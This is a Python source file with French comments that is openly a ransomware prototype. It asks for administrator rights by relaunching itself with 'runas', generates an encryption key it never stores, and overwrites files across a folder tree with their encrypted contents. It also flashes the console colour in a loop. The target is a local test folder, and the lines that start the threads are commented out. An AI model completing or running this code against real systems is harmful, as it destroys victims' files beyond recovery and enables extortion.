import glob, ctypes, threading, sys, os, time, getpass
from cryptography.fernet import Fernet

# Paramètres du cmd
os.system("@echo off")
os.system("title CRYPTING")
os.system("cls")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
        

def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
    
    while True:
        os.system("color 4a")
        time.sleep(0.1)

class Crypt: # Classe pour le cryptage
    
    def __init__(self): # Se lance à l'initialisation de la classe
        
        self.key = Fernet.generate_key() # Génère une clé
        self.fernet = Fernet(self.key) # Initialiser le module Fernet

    def Crypting(self, file):
        try:
            
            file = file.replace("\\", "/") # Remplacer les backslashs
            
            with open(file, 'rb') as f: # Stocker le contenu du fichier dans une variable
                original = f.read()
            
            encrypted = self.fernet.encrypt(original) # Crypter la variable
            
            with open(file, 'wb') as encrypted_file: # Remplacer le contenu du fichier par la variable cryptée
                encrypted_file.write(encrypted)
                print(f"{file} : Ok")
            
        except: print(f"{file} : Error")


    def CryptFiles(self, path):
        
        while True:
        
            path += "/*" # Entrer dans le dossier
            print(path)
            folder = glob.glob(path) # Liste du contenu du dossier
            print(folder)
            
            if len(folder) == 0: 
                print("End")
                break # Si le dossier est vide quitter la boucle
            else:  # Sinon crypter le contenu du dossier
                for file in folder: self.Crypting(file)
        
        
crypting = Crypt() # Créer une instance de la classe


if is_admin(): # Si l'utilisateur est administrateur
    
    # Threads
    set_background_color = threading.Thread(target=SetBackgroundColor)
    paths = [f"D:/{getpass.getuser()}/Documents/Python Scripts/Ransomware/test lolo"]
    threads = [set_background_color] # Liste des threads
    # Pour chaque chemin dans la liste charger la fonction de cryptage avec le chemin spécifié
    for path in paths: print(path),  threads.append(threading.Thread(target=crypting.CryptFiles, args=(path,)))
    print(threads)
    """for thread in threads: thread.start()
    for thread in threads: thread.join()"""
    print("CA CRYPT MON REUF")
    
    
else: # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
